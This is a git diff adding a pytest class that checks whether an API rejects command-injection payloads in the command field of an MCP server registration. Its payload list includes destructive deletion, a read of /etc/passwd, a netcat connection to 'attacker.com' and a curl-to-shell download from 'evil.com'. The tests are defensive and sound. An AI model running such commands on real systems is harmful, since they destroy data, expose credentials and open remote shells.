@@ -105,3 +105,53 @@ class TestCredentialIsolation:
             os.environ.pop("TEST_SECRET_KEY", None)
             os.environ.pop("TEST_API_KEY", None)
             os.environ.pop("TEST_PASSWORD", None)
+
+
+class TestCommandInjectionPrevention:
+    """Security tests for command injection prevention."""
+
+    @pytest.mark.anyio
+    async def test_command_injection_rejected(
+        self,
+        async_client: AsyncClient,
+        auth_headers: dict[str, str],
+    ) -> None:
+        """Test that command injection attempts are rejected.
+
+        Verifies:
+        - Commands with shell metacharacters are rejected
+        - Dangerous command sequences are blocked
+        - Proper error response returned (400 Bad Request)
+        """
+        # Test various command injection payloads
+        injection_payloads = [
+            "; rm -rf /",
+            "&& cat /etc/passwd",
+            "| nc attacker.com 4444",
+            "`whoami`",
+            "$(whoami)",
+            "; curl http://evil.com/malware.sh | sh",
+        ]
+
+        for payload in injection_payloads:
+            # Attempt to create MCP server with malicious command
+            response = await async_client.post(
+                "/api/v1/mcp-servers",
+                json={
+                    "name": "malicious-server",
+                    "transport_type": "stdio",
+                    "command": f"npx{payload}",
+                    "args": ["-y", "@test/server"],
+                },
+                headers=auth_headers,
+            )
+
+            # Should reject with 400 or 422 (validation error)
+            assert response.status_code in (400, 422), \
+                f"Command injection payload should be rejected: {payload} " \
+                f"(got {response.status_code})"
+
+            # Verify error response structure
+            data = response.json()
+            assert "error" in data or "detail" in data, \
+                f"Response should contain error information: {data}"
